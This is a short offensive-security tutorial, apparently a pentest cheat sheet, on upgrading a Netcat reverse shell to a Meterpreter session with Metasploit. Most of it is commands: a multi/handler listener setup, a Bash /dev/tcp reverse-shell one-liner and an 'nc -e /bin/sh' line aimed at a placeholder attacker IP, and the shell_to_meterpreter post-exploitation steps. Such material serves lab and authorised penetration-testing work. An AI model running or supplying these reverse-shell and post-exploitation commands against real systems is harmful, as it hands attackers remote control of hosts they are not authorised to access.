# Upgrading a Netcat Shell to Meterpreter

Netcat shells can be upgraded to meterpreter shells in three steps:

1. Start multi handler module to intercept the reverse shell using a Linux x86 payload
2. Issue the reverse shell on a Linux host with a Bash reverse shell
3. Use the post exploitation Metapsploit module shell_to_meterpreter to target the session with the reverse Bash shell

The starting point for the following is already having the ability to initiate a reverse Netcat shell.

```bash
# Start Metasploit and setup a multi handler
msfconsole
use exploit/multi/handler
set lhost [listening host IP]
set lport 4444
set payload linux/x86/shell_reverse_tcp
run

# Interacting with jobs running in the background
jobs					# Displays Jobs
jobs -K [id]  # Kill Job ID
jobs -h				# Help menu

# With a listener running, we can setup a reverse shell and connect back
# This is executed on the target - this is done via RCE or other vectors
bash -i >& /dev/tcp/[AttackboxIP]/4444 0>&1
# or
nc [ip attack box 4444] -e /bin/sh

# Send netcat shell to background first
CTRL+Z || background
# Upgrade shell to meterpreter
sessions -u [session id]							# Executes automatically
post/multi/manage/shell_to_mterpreter # Executes manually

# Automatically with sessions:
sessions -u 1
# View sessions
sessions
# Interact with a different session
sessions -i 2

# Manually
use post/multi/manage/shell_to_meterpreter
set session 1
run
# View sessions
session
# Select session 2
sessions -i 2
```

In order to run, the exploit requires write access to the current directory to write the payload. 
If you aren't running with root, it might be necessary to write to a world writable directory such as `/tmp`. 